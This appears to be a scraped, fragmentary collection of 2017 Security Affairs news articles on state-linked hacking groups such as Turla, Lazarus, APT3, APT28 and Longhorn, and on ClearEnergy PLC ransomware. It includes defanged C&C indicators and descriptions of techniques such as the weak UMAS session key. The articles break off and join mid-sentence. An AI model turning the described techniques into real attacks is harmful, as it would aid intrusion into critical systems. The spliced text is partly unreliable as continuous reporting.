<200d>#Hot <200d>#X\n\nWhen resolving this shortened link, it leads to static[.]travelclothes.org/dolR_1ert.php , which was used in the past as a watering hole C&C by the Turla crew.\u201d states ESET.\n\nExperts noticed that this above bit.ly URL was only accessed 17 times, which could indicate that hackers were testing the technique.\n\nResearchers also highlighted that some of the APIs used by the malicious extension will no longer work in future Firefox releases, for this reason, upcoming versions of the backdoor will have to be implemented differently.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Turla APT group, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/javascript-malware", "topic_name": "JavaScript Malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/turla", "topic_name": "Turla"}]}, {"news_name": "US intelligence officials believe Russian Hackers are behind the Qatar hack", "news_link": "https://securityaffairs.co/wordpress/59827/intelligence/russian-hackers-qatar-hack.html", "title": "US intelligence officials believe Russian Hackers are behind the Qatar hack\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 8, 2017", "body": "Russian hackers have planted false story news raised the crisis in the Gulf among Qatar and other states, including Saudi Arabia, the United Arab Emirates, Egypt and Bahrain that cut ties to the country.\n\nAccording to the US security agencies, Russian hackers were behind the intrusion  reported by the Qatari government two weeks ago,\n\nThe Gulf States accuses Qatar of supporting extremist groups, but the Qatari government denied any allegations.\n\nQatar asked for a help to US, a team of FBI experts went in the country in late May to find evidence of the attack and determine the author.\n\n\u201cSheikh Saif Bin Ahmed Al-Thani, director of the Qatari Government Communications Office, confirmed that Qatar\u2019s Ministry of Interior is working with the FBI and the United Kingdom\u2019s National Crime Agency on the ongoing hacking investigation of the Qatar News Agency.\u201d reported the CNN.\n\nThe crisis escalated after the so-called Qatar hack, cyber attacks hit the the Qatar\u2019s state-run news agency.

It will compromise remote computers if the user executes applications stored on the pandemic file server.\n\n\n\nThe Pandemic tool doesn\u2019t change the file on the infected system when victims request a file from it, they will receive a trojanized replacement of the legitimate application.\n\nThe Pandemic implant can replace up to 20 programs, with a maximum size of 800MB.\n\n\u201cPandemic is a tool which is run as kernel shellcode to install a file system filter driver.

Security researchers discovered that North Korean Lazarus APT group was behind recent attacks on banks, including the Bangladesh cyber heist.\n\nAccording to security experts, the group was behind, other large-scale cyber espionage campaigns against targets worldwide, including the Troy Operation, the DarkSeoul Operation, and the Sony Picture hack.\n\n\n\nAccording to the experts from Group-IB, the attacks against the SWIFT systems used by banks worldwide left the most clues.\n\nThe Lazarus APT group conducted massive reconnaissance operations before the banks attack in order to gather information on the infrastructure of the targets.\n\n\u201cWe have detected and thoroughly analyzed the C&C infrastructure used by Lazarus,\u201d explained Dmitry Volkov, Head of Threat Intelligence Department. \u201cOur research shows how hackers gained access to the banks\u2019 information systems, what malware they used, and who their attempts were aimed at.\u201d\n\nInvestigating the Group-IB activity the researchers analyzed the complex botnet infrastructure used by the hackers.\nTo make harder the investigation of the attribution of the attacks, the cyberspies used a three-layer architecture of compromised servers that communicate through SSL encrypted channels.\n\n\u201cIn addition to encrypted traffic, data sent through SSL channel was additionally encrypted. The attackers achieved anonymity by employing a legitimate VPN client \u2013 SoftEther VPN. In some cases, they also used corporate web servers that were part of the attacked infrastructure.\u201d states the report published by Group-IB.\n\n\n\nAccording to the researchers, the APT group changed its TTPs after the publication of the Operation Blockbuster report that revealed much information about the activity of the crew.\n\n\u201cAccording to our investigation of the Lazarus infrastructure, the threat actors connected to the end C&C layer (Layer3) from two North Korean IP addresses 210.52.109.22 and 175.45.178.222. The second IP-address relates to Potonggang District, perhaps coincidentally, where National Defence Commission is\nlocated \u2014 the highest military body in North Korea\u201d continues the report.\n\nInvestigating the Lazarus attack, Group-IB discovered the hackers used two IP addresses belonging to the C&C server infrastructure.\n\nThe first is 210.52.109.22 is assigned to a company in China named China Netcom, but according to Group-IB\u2019s sources the range of IPs 210.52.109.0/24 was assigned to North Korea\n\nThe second IP address, 175.45.178.222, points to  North Korean Internet service provider because it is allocated to the Potonggang District. This is the same District where the military National Defence Commission is located.\n\n\u201c210.52.109.22 belongs to an autonomous system China Netcom. However, some sources indicate that the set of IPs 210.52.109.0/24 is assigned to North Korea. 175.45.178.222 refers to a North Korean Internet service provider. The Whois service indicates that this address is allocated to the Potonggang District, perhaps coincidentally, where Natinal Defence Commission is located \u2014 the highest military body in North Korea\u201d\n\nThe researchers also discovered that the Lazarus APT Group is masquerading its operations as Russian hackers. The group used false flags in its malware to deceive the investigators and to attribute the attack to the Russian hackers.\n\nGroup-IB experts, like peers from security firm BAE, discovered Russian words in the source code of the malware, but they noticed an incorrect use of the words.\n\nHackers also leveraged Flash and Silverlight exploits used by Russian state-sponsored hackers, they also used the Enigma Protector, an anti-tampering system for executable files developed by a Russian company.\n\n\u201cThey added specific debugging symbols and strings containing Russian words to a new version of Client_TrafficForwarder, a\nmodule designed to proxy network traffic.\u201d continues the report. \u201cTo protect their executables, they used Enigma Protector, a commercial product, which was created by a Russian software developer. They also used exploits for Flash and SilverLight from sets of exploits created by Russian-speaking hackers. These masquerade techniques did initially mislead some researchers who conducted express analysis of malicious code.\u201d\n\nI don\u2019t want to tell you more, for more details on the Group-IB investigation give a look at the interesting report that also includes IOCs about the malware used in recent operations attributed to the Lazarus Group.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Lazarus APT Group, North Korea)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/lazarus-apt", "topic_name": "Lazarus APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sony-hack", "topic_name": "Sony hack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}]}, {"news_name": "Qatar news agency hacked, attackers posted fake news", "news_link": "https://securityaffairs.co/wordpress/59407/hacking/qatar-news-agency-hacked.html", "title": "Qatar news agency hacked, attackers posted fake news\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 24, 2017", "body": "Qatar faced an unprecedented security breach, unknown attackers posted fake news stories attributed to its ruler on highly sensitive regional political issues.\n\n\n\nThe hackers hit the Qatar official news agency website and Twitter account in the early hours of the morning causing serious problem to the country.\n\nThe government Communications Office confirmed that the story published by hackers is false, and had \u201cno basis whatsoever\u201d.

FireEye named the threat group APT3 which has also been described as TG-0100, Buckeye, Gothic Panda, and UPS and described them as \u201cone of the most sophisticated threat groups\u201d being tracked at the time.\n\nSince then, APT3 has been actively penetrating corporations and governments in the US, UK and most recently Hong Kong \u2014 and everyone has been trying to figure out who they are. APT3 functions very differently than 3LA, the former Chinese military hacking organization leading to the assumption that APT3 is not part of the military complex. At least not officially.\n\nOn May 9th, 2017, an unknown party using the alias \u2018intrusiontruth\u2019 published a series of blogs posts describing connections between the Pirpi RAT command and control components and shareholders of the Chinese security contractor Guangzhou Boyu Information Technology Company, aka Boyusec.\n\n\u201cOn May 9, a mysterious group calling itself \u201cintrusiontruth\u201d identified a contractor for the Chinese Ministry of State Security (MSS) as the group behind the APT3 cyber intrusions.\u201d states the analysis published by Recorder Future.\n\nThe names of two specific shareholders of Boyusec appear in the domain registration for the Pirpi C&C servers.  This is particularly interesting because Boyusec supports the Chinese Ministry of State Security (MSS) by collecting civilian human intelligence. Think of them as an outsourcer for a government agency like the United States\u2019 National Security Agency (NSA).\n\nAlso interesting is that in 2016 a Pentagon report described the relationship between Boyusec and network equipment manufacturer, Huawei. According to the report, the two companies were colluding to develop security equipment with embedded backdoors which would likely be used by Boyusec to compromise Huawei customers.\n\n\u201cIn November 2016, the Washington Free Beacon reported that a Pentagon internal intelligence report had exposed a product that Boyusec and Huawei were jointly producing.\u201d continues the analysis.\u201dAccording to the Pentagon\u2019s report, the two companies were working together to produce security products, likely containing a backdoor, that would allow Chinese intelligence \u201cto capture data and control computer and telecommunications equipment.\u201d The article quotes government officials and analysts stating that Boyusec and the MSS are \u201cclosely connected,\u201d and that Boyusec appears to be a cover company for the MSS.\u201d\n\nTo protect our networks, it is important to assess the threats. An important part of threat assessment is to anticipate the motivation of the attackers. APT3 has demonstrated above average skills and has been active for a long time. Add ties to the network vendor supply chain and you have the makings of a dangerous adversary. As part of the Chinese MSS structure you can start to guess at motivation. With this new information, it is a good time to reassess your threat model.\n\n\n\n\u201cThe implications are clear and expansive. Recorded Future\u2019s research leads us to attribute APT3 to the Chinese Ministry of State Security and Boyusec with a high degree of confidence. Boyusec has a Boyusec has a documented history of producing malicious technology and working with the Chinese intelligence services.\u201d concludes the analysis.\n\nAbout the author:  Steve Biswanger has over 20 years experience in Information Security consulting, and is a frequent speaker on risk, ICS and IoT topics.

When the target believes that the phishing site is the real login site of the internet service he was using, he might reenter his credentials on the phishing site.\u201d reads the analysis shared by Trend Micro.\n\n\n\nThe technique was used to swap inactive open tabs with an illegitimate site, in this way attackers tricked victims into providing sensitive information while thinking to visit a legitimate website.\n\n\u201cPawn Storm has been using a variant of tabnabbing.15 In this attack scenario, the target gets an email supposedly coming from a website he might be interested in\u2014maybe from a conference he is likely to visit or a news site he has subscribed to. The email has a link to a URL that looks very legitimate. When the target reads his email and clicks on the link, it will open in a new tab. This new tab will show the legitimate website of a conference or news provider after being redirected from a site under the attackers\u2019 control. The target is likely to spend some time browsing this legitimate site. Distracted, he probably did not notice that just before the redirection, a simple script was run, changing the original webmail tab to a phishing site. When the target has finished reading the news article or conference information on the legitimate site, he returns to the tab of his webmail. He is informed that his session has expired and the site needs his credentials again. He is then likely to reenter his password and give his credentials away to the attackers. \u201d states the analysis.\n\nThe security experts believe the APT28 group is a sort of cyber army working for the Russian military intelligence agency GRU, it was involved in an impressive series of cyber attacks against high-profile targets, including the DNC campaign and the Bundestag.\n\nAccording to the Reuters, The National Cybersecurity Agency of France (ANSSI) confirmed the cyber attacks against the Macron\u2019s staff, but did not provide information on their origin.\n\nThe Wall Street Journal reported people involved in the Macron\u2019s campaign confirmed that staffers received phishing emails, but claimed the attacks had failed.\n\n\u201cMounir Mahjoubi, digital director of Mr. Macron\u2019s campaign, confirmed the attempted hacking, saying that several staffers had received emails leading to the fake websites. The phishing emails were quickly identified and blocked, and it was unlikely others went undetected, Mr. Mahjoubi said.\u201d reported the WSJ.\n\n\u201cWe can\u2019t be 100% sure,\u201d he said, \u201cbut as soon as we saw the intrusion attempts, we took measures to block access.\u201d\n\nA representative of En Marche! has accused Russian nation-state actors of interfering with the elections in an effort to help pro-Moscow candidates.\n\n\u201cOn March 15, someone used the name Johny Pinch and a fake Paris street address to register the name onedrive-en-marche.fr, according to public internet records.

Once a secret these government agencies were public revealed like the Equation Group as well as the tailored access operations (TAO).\n\nThe same tools that are taking place in debates about digital privacy are now operating as you read this, in some digital battle over the internet. This is only the tip of the iceberg and with every disclosure more, we realize that every technology is a risk at bay.\n\n\n\nBeyond the inevitable costs for the global economy, the risks for human life are as certain as the damage of physical weapons. One simple program can turn a surveillance camera, a cellphone, a television, or anything into a weapon in a network of connected devices that can bring down massively critical infrastructure services.\n\nNowadays the development of new cryptologic technologies as well as the implementation of information security frameworks, and awareness is the only guarantee the human existence has to protect itself. If we consider the impact of a massive attack on critical infrastructure, we must also consider that every single service will stop and no one will be able to call asking for help.\n\nMore disturbing than the impacts of such attacks is the reality that it is already taking place.\n\nThe news of North Korea failing to launch a missile due to US Cyber Command attack bring down a new level of threat landscape and theater of operations for information security. Today the human domain is a target on these cyber operations, and apparently, every aspect of society can suffer damages, like hospitals or even the power grid.\n\nWe see today a completely new market of jobs and opportunities emerging alongside these threats to protect us from rogue nation state actors. It is necessary to corporations and partners to unite with law enforcement agencies to develop new tools and awareness to the average citizen. A new framework for cyber security, for pre-emptive readiness has to be taking into account as the first priority to every democratic country connected to the internet.\n\nThe US sabotage of North Korea missile is not the only news about cyberwarfare. The Mirai botnet and the dangers of IoT are another example of this ongoing threat on a blink of an eye, on a click of a button. As technologies evolve, we also must evolve the countermeasures to detain those threats. The possibility of state actors managing to interfere in democratic republics corroborates the impact in the civil society that can damage a whole nation and the world, as was in the news the Russia interference in Europe.\n\nWe are on a verge of a drastic change in awareness and preparedness in the cyber domain, and we must prepare ourselves for this new reality as it reaches out and affects everyone, everywhere. With the development of new technologies of information security, the creation of jobs can be a reality emerging from the chaos of destruction launched upon us as menaces from these rogue states.\n\nIt has been the legacy of Computer Science brings humanity to its better and worst in history. As of today, we must change the reality of that by advancing the importance of security and development of new technologies to withstand such menaces with no cost at all of human lives.\n\nSources:\n\nhttp://www.bbc.com/news/business-39625468\n\nhttp://www.telegraph.co.uk/news/2017/04/06/left-of-launch-attacks-may-bringing-north-korean-missiles/\n\nhttp://www.csoonline.com/article/3190447/security/iot-malware-clashes-in-a-botnet-territory-battle.html#tk.rss_news\n\nhttp://ndupress.ndu.edu/Media/News/Article/1130649/information-warfare-in-an-information-age/\n\nhttp://www.defenseone.com/threats/2017/04/chinas-information-warriors-grow-more-disciplined-effective-us-cyber-leaders/136732/\n\nhttp://cimsec.org/threat-defense-control-cyber-warfare/32106\n\nhttp://www.bbc.com/news/world-europe-39401637\n\nhttp://www.matthewaid.com/post/159634985471/north-korea-more-likely-to-launch-cyberattack-than\n\nAbout the author Luis Nakamoto\n\nLuis Nakamoto is a Computer Science student of Cryptology and a enthusiastic of information security having participated in groups like Comiss\u00e3o Especial de Direito Digital e Compliance (OAB/SP) and CCBS (Consci\u00eancia Cibern\u00e9tica Brasil) as a researcher in new technologies related to ethical hacking, forensics and reverse engineering.

Symantec has been protecting its customers from Longhorn\u2019s tools for the past three years and has continued to track the group in order to learn more about its tools, tactics, and procedures.\u201d reads the analysis published by Symantec.\n\n\u201cThe tools used by Longhorn closely follow development timelines and technical specifications laid out in documents disclosed by WikiLeaks.\u201d\n\nSymantec believes Longhorn is a North American hacking group that has been active since at least 2011. The group is very sophisticated and used zero-day exploits and complex malware to conduct targeted attacks against governments and organizations in almost every industry, including financial, energy, telecommunications and education, aerospace.\n\nThe Longhorn group is a well-resourced hacking team that operated on a standard Monday to Friday working week in an American time zone. The nature of the targets and its Techniques, Tactics, and Procedures (TTPs) suggests the Longhorn group is a state-sponsored crew.\n\nThe targets were all in located in the Middle East, Europe, Asia, and Africa. On one case, the researchers observed the Longhorn group compromising a computer in the US, following infection, an uninstaller was quickly executed, which demonstrates that this victim was infected unintentionally.\n\n\u201cThe Longhorn group shares some of the same cryptographic protocols specified in the Vault 7 documents, in addition to following leaked guidelines on tactics to avoid detection.\u201d continues Symantec. \u201cGiven the close similarities between the tools and techniques, there can be little doubt that Longhorn\u2019s activities and the Vault 7 documents are the work of the same group.\u201d continues Symantec.\n\nDigging the precious Vault 7 archive the experts discovered the Fluxwire cyber espionage malware. The documents related to this malware include a changelog of dates for when new features were added to the malicious code, the features, the timeline are coherent with the development cycle of the Corentry malware created by Longhorn APT.\n\n\u201cThese dates align closely with the development of one Longhorn tool (Trojan.Corentry) tracked by Symantec. New features in Corentry consistently appeared in samples obtained by Symantec either on the same date listed in the Vault 7 document or several days later, leaving little doubt that Corentry is the malware described in the leaked document.\u201d reads Symantec.\n\n\u201cEarly versions of Corentry seen by Symantec contained a reference to the file path for the Fluxwire program database (PDB) file. The Vault 7 document lists removal of the full path for the PDB as one of the changes implemented in Version 3.5.0.\u201d\n\n\n\n\u201cUp until 2014, versions of Corentry were compiled using GCC [GNU Compiler Collection]. According to the Vault 7 document, Fluxwire switched to an MSVC compiler for version 3.3.0 on February 25, 2015. This was reflected in samples of Corentry, where a version compiled on February 25, 2015, had used MSVC as a compiler.\u201d\n\nA second document in the Vault 7 archive details Fire and Forget, a specification for user-mode injection of a payload by a tool called Archangel.\n\nThe specification of the malicious code and the interface used to load it matches the Longhorn tool called Backdoor.Plexor.\n\nThe experts discovered many other similarities, another leaked CIA document outlined cryptographic protocols that should be implemented in the malware development.\n\n\u201cA third document outlines cryptographic protocols that malware tools should follow. These include the use of inner cryptography within SSL to prevent man-in-the-middle (MITM) attacks, key exchange once per connection, and use of AES with a 32-bit key. These requirements align with the cryptographic practices observed by Symantec in all of the Longhorn tools.\u201d continues Symantec.\n\nanother Vault 7 document recommends using of in-memory string de-obfuscation and Real-time Transport Protocol (RTP) for communicating with the command and control (C&C) servers.\n\nAll the above techniques and protocols were implemented in all the hacking tools of the Longhorn group.\n\nResearchers from Symantec discovered a number of indicators that confirm Longhorn was from an English-speaking, North American country.\n\n\u201cThe acronym MTWRFSU (Monday Tuesday Wednesday ThuRsday Friday Saturday SUnday) was used to configure which day of the week malware would communicate with the attackers. This acronym is common in academic calendars in North America.\u201d reads Symantec.\u201dSome of the code words found in the malware, such as SCOOBYSNACK, would be most familiar in North America. In addition to this, the compilation times of tools with reliable timestamps indicate a time zone in the Americas.\u201d\n\nSummarizing, there is no doubt Longhorn group has the same abilities and hacking tools of the CIA operators documented in the Vault 7 documents.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Longhorn group, CIA Vault 7)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cia-vault-7", "topic_name": "CIA Vault 7"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/longhorn-group", "topic_name": "Longhorn group"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/wikileaks", "topic_name": "Wikileaks"}]}, {"news_name": "Operation Cloud Hopper \u2013  APT10 goes after Managed Service Providers", "news_link": "https://securityaffairs.co/wordpress/57781/apt/operation-cloud-hopper-apt10.html", "title": "Operation Cloud Hopper \u2013  APT10 goes after Managed Service Providers\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 6, 2017", "body": "Security experts from PwC UK and BAE Systems have uncovered a widespread hacking campaign, tracked as Operation Cloud Hopper, targeting managed service providers (MSPs) in multiple countries worldwide.

This includes Schneider Electric Unity series PLCs and Unity OS from version 2.6 and later, other PLC models of leading vendors include GE and Allen-Bradley (MicroLogix family) which are also found to be vulnerable to the ransomware attack.\n\nRansomware is a type of malware that infects computers and encrypts their content with strong encryption algorithms, and then demands a ransom to decrypt that data. \u201cClearEnergy attack is based on the most comprehensive and dangerous vulnerability that ever found in Critical Infrastructure, SCADA and ICS Systems, and affects a wide range of vulnerable products from different manufacturers and vendors. These attacks target the most important assets and critical infrastructure and not just because they are easy to attack but also hard to be recovered\u201d. Says Brig. Gen. (ret.) Rami Ben Efraim, CEO at CRITIFENCE.\n\nIn 2016 we have seen a rise in ransomware, where the victims were businesses or public organizations that on one hand had poor security and on the other hand the alternative cost of losing business continuity was high. Last year there were reports of a targeted ransomware for PC and other workstation within critical infrastructure, SCADA and industrial control systems. A month ago, scientists from the School of Electrical and Computer Engineering in Georgia Institute of Technology have simulated a proof-of-concept ransomware attack (LogicLocker) in a limited scope designed to attack critical infrastructure, SCADA and industrial control systems.\n\nClearEnergy acts similarly to other malicious ransomware programs that infect computers and encrypts their content with strong encryption algorithms, and then demands a ransom to decrypt that data back to its original form, with one major difference. ClearEnergy is a malicious ransomware attack designed to target Critical Infrastructure and SCADA systems such nuclear and power plant facilities, water and waste facilities, transportation infrastructure and more.\n\n\u201cAlthough the codename ClearEnergy, the vulnerabilities behind ClearEnergy ransomware takes us to our worst nightmares where cyber-attacks meets critical infrastructure. Attackers can now take down our electricity, our water supply and our oil and gas infrastructure by compromising power plants, water dams and nuclear plants. Critical Infrastructure are the place in which terrorists, activists, criminals and state actors can make the biggest effect. They have the motivation, and ClearEnergy shows that they have also the opportunity.\u201d Says Brig. Gen. (ret.) Rami Ben Efraim, CEO at CRITIFENCE.\n\nOnce ClearEnergy is executed on the victim machine it will search for vulnerable PLCs in order to grab the ladder logic diagram from the PLC and will try to upload it to a remote server. Finally ClearEnergy will start a timer that will trigger a process to wipe the logic diagram from all PLCs after one hour unless the victim will pay in order to cancel the timer and to stop the attack.\n\nSCADA and Industrial Control Systems has been found to be weak in the recent years, against numerous types of attacks that result in damages in a form of loss of service which translate to a power outage, or sabotage. The damage that ClearEnergy attack can cause to the critical infrastructure is high since it can cause a power failure and other damages to field equipment, thus making the recovery process slow in most cases, and might even bring a plant to a halt.\n\nClearEnergy, which is based on vulnerabilities CVE-2017-6032 (SVE-82003203) and CVE-2017-6034 (SVE-82003204) that have been discovered by CRITIFENCE security researchers, disclosed profound security flaws in the UMAS protocol of the vendor Schneider Electric. UMAS protocol seems to suffer from critical vulnerabilities in the form of bad design of the protocol session key, which results in authentication bypass. \u201cUMAS is a Kernel level protocol and an administrative control layer used in Unity series PLC and Unity OS from 2.6. It relies on the Modicon Modbus protocol, a common protocol in Critical Infrastructure, SCADA and industrial control systems and used to access both unallocated and allocated Memory from PLC to SCADA system. What worries our researchers is that it may not be entirely patched within the coming years, since it affecta a wide range of hardware and vendors.\u201d Says Mr. Eran Goldstein, CTO and Founder of CRITIFENCE.\n\nFollowing to the disclosure, Schneider Electric has confirmed that the Modicon family of PLCs products are vulnerable to the findings presented by CRITIFENCE and released an Important Cybersecurity Notification (SEVD-2017-065-01). ICS-CERT, Department of Homeland Security (DHS) released an important advisory earlier this morning. The basic flaws, which was confirmed by Schneider Electric, allows an attacker to guess a weak (1-byte length) session key easily (256 possibilities) or even to sniff it. Using the session key, the attacker is able to get a full control of the controller, to read controller\u2019s program and rewriting it back with the malicious code.\n\n\u201cThe recovery process from this type of cyber-attacks can be very hard and slow in most cases due to lack of management resources in the field of SCADA and process automation. Slow recovery process multiplied by the number of devices need be fixed, as well configuration restoration makes the recovery processes very painful\u201d. Says Mr. Alexey Baltacov, Critical Infrastructure Architect at CRITIFENCE\n\n\n\n\u201cRecovering from such an attack would be a slow and tedious process, and prone to many failures. Every plant using PLC\u2019s which is part of a production line and would have dozens of these devices all around the plant. Let\u2019s assume that each PLC is indeed backed-up to its recent configuration. It would take a painstakingly long time to recover each and every one of them to its original status.\u201d Says Mr. Eyal Benderski, Head of the Critical Infrastructure and SCADA/ICS Cyber Threats Research Group at CRITIFENCE. \u201cThis restoration process would take a long time, on which the plant would be completely shut down. The costs of that shut down could be substantial, and for critical processes it could affect for more than the down-time, as it is the case with energy plants. Consider a process which relies on keeping a constant temperature for a biological agent or chemical process. Breaking the process chain could require re-initialization that may be days and weeks long. Furthermore, since dealing with the OT network is much more complicated for operational reasons, on many occasions plants don\u2019t even have up-to-date backups, which would require complete reconfiguration of the manufacturing process. Given these complications, plants would very much prefer paying the ransom than dealing with the minor chance that the backups will work as expected. Lastly, let\u2019s assume the backups went on-air as soon as possible, what would prevent the same attack from recurring, even after paying?\u201d\n\nAbout the author:\n\n\n\nCRITIFENCE is a leading Critical Infrastructure, SCADA and Industrial Control Systems cyber security firm.

In the past, we saw other attacks against people using the HWP application.\n\n\n\nThe ROKRAT RAT was used in a phishing campaign detected several weeks, attackers leveraged on weaponized documents as attachments.\n\n\u201cThis actor is quick to cover their tracks and very quickly cleaned up their compromised hosts. We believe the compromised infrastructure was live for a mere matter of hours during any campaign,\u201d reads the analysis published by Cisco Talos researchers Warren Mercer, Paul Rascagneres and Matthew Molyett.\n\nThe experts speculate the involvement of a sophisticated threat actor that aimed to compromise systems of South Korean users in the public sector.\n\nThe attackers sent phishing messages from an email address tied to South Korea\u2019s Yonsei University on the topic of an upcoming and fictitious \u201cKorean Reunification and North Korean Conference\u201d.\n\nThe attackers compromised a legitimate email address of a big forum powered by a university in Seoul to send out spear phishing email.\n\nThe attackers attempted to trick victims into open the attachments to provide feedback to conference organizers. Phishing emails contain two HWP documents that embed Encapsulated PostScript (EPS) object.\n\n\u201cThe purpose of the EPS is to exploit a well-known vulnerability (CVE-2013-0808) to download a binary disguised as a .jpg file. This file is decoded and finally an executable is launched: ROKRAT,\u201d said researchers.\n\nThe EPS flaw, tracked as CVE-2013-0808, was discovered in 2013, it is an EPS viewer buffer overflow vulnerability, that could be exploited by attackers to execute arbitrary code on targeted machines.\n\n\u201cAn HWP document is composed by OLE objects. In our case, it contains an EPS object named BIN0001.eps. As with all HWP documents the information is zlib compressed so you must decompress the .eps to get the true shellcode.\u201d continues the analysis.\n\nThe shellcode is used to trigger the CVE-2013-0808 vulnerability and download the ROKRAT RAT binary from the command and control server. The binary is dropped as a .jpg file named \u201cworker.jpg\u201d or \u201ckingstone.jpg\u201d.\n\nIf the malware detects a sandbox environment it will block its activity and try to deceive security researchers by generating fake traffic.\n\nThe malware appears to connect and load either an Amazon video of a game called \u201cMen of War\u201d or a Hulu anime video called \u201cGolden Time\u201d.\n\nThe security experts warned of similar attacks against other high-value targets, it is possible that threat actors can exploit the EPS vulnerability to target also Microsoft Word users.\n\nThe experts also noticed observed an evolution of the ROKRAT RAT, it is using new communication channels, such as Twitter and Yandex and Mediafire cloud platforms.\n\nIn this way, the attacker can make hard the detection of the malicious traffic and leverages also the use of HTTPS connectivity implemented by these services.\n\n\u201cThis investigation shows us once again that South Korean interests sophisticated threat actors.\u201d concludes the analysis.\n\n\u201cThis campaign shows us a motivated malware actor.

Penguin Turla was designed to compromise Linux machines with a backdoor based on the open-source LOKI2 backdoor that was released in Phrack magazine in September 1997.\n\n\u201cThe revelation that the Moonlight Maze attacks were dependent on a Solaris/*NIX toolkit and not a Windows one as is the case with most of Turla, actually revived our hopes.\u201d reads the analysis published by Kaspersky.  \u201cIn 2014, Kaspersky announced the discovery of Penquin Turla, a Linux backdoor leveraged by Turla in specific attacks. We turned our attention once again to the rare Penquin samples and noticed something interesting: the code was compiled for the Linux Kernel versions 2.2.0 and 2.2.5, released in 1999. Moreover, the statically linked binaries libpcap and OpenSSL corresponded to versions released in the early 2000s. Finally, despite the original assessment incorrectly surmising that Penquin Turla was based on cd00r (an open-source backdoor by fx), it was actually based on LOKI2, another open-source backdoor for covert exfiltration written by Alhambra and daemon9 and released in Phrack in the late 1990s.\u201d\n\nGuerrero-Saade explained that of the 45 Moonlight Maze binaries that were detected by experts at Kaspersky, nine of them were examples of the LOKI2 backdoor.\n\nThis discovery is amazing because it demonstrates a 20-year-old hacking tool is still effective against high-value targets.\n\n\u201cThis speaks to the state of Linux security and the lack of awareness\u2014and even hubris\u2014that goes into some Linux system administration, an ill-advised approach for government and corporate settings,\u201d Guerrero-Saade said. \u201cThese guys (Moonlight Maze) didn\u2019t have to play the cat-and-mouse game with antivirus companies or rewrite their toolkit 30 times to get it through VirusTotal and still hope it works. It\u2019s terrifying to see that the evolved Penquin Turla samples are based on 20 year old code and still linked to libraries built in 1999-2004 and they still work on modern machines. You\u2019d never see that on Windows.\u201d\n\nSummarizing the possible link between the Moonlight Maze\u2019s early UNIX and Solaris toolkits and modern Turla Windows attacks is the LOKI2 backdoor used in the Penguin Turla attacks.\n\nThe researchers conducted an intriguing a lucky investigation, they have found the original artifacts thanks a system administrator in the U.K. named David Hedges who in cooperation with the London Metropolitan Police and the FBI logged every keystroke happening on a server targeted by the Moonlight Maze. The researchers were able to find Hedges because of a redaction error in an FBI FOIA release.\n\nHedges confirmed that the server was still running and he provided access to logs that include evidence of the Moonlight Maze operation, along with the a toolkit with 43 binaries used in their attacks.\n\nThe investigation revealed further details, the researchers focused on a little-known operation codenamed \u2018Storm Cloud\u2019. The toolkit used in the attacks was an evolution of the toolkit leveraged by the same Moonlight Maze threat actors.\n\nThe first attacks became public in 1999, Storm Cloud was also made public four years later, and also in this case, the code was based on the LOKI2 backdoor.\n\n\u201cWe\u2019re really trying to push the crowdsourcing element to this,\u201d Guerrero-Saade said. \u201cThomas\u2019 first talk helped us find David and more about Moonlight Maze. We need help. We need another David Hedges, someone with access to the Storm Cloud artifacts to really solidify this link.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Penquin Turla, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kaspersky", "topic_name": "Kaspersky"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/moonlight-maze", "topic_name": "Moonlight Maze"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/penquin-turla", "topic_name": "Penquin Turla"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/storm-cloud", "topic_name": "Storm Cloud"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/uroburos", "topic_name": "Uroburos"}]}, {"news_name": "German Military to Launch the Bundeswehr\u2019s new Cyber and Information Space Command", "news_link": "https://securityaffairs.co/wordpress/57607/cyber-warfare-2/cyber-and-information-space-command.html", "title": "German Military to Launch the Bundeswehr\u2019s new Cyber and Information Space Command\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 1, 2017", "body": "Today the German Military is going to launch a cyber command, the Bundeswehr\u2019s new Cyber and Information Space (CIR) Command, a structure that is considered strategic for the defence of the country from cyber attacks.\n\nAccording to the new commander, Lieutenant General Ludwig Leinhos, Germany is taking a leading role among the members of the NATO alliance.\n\n\u201cLeinhos said the main tasks 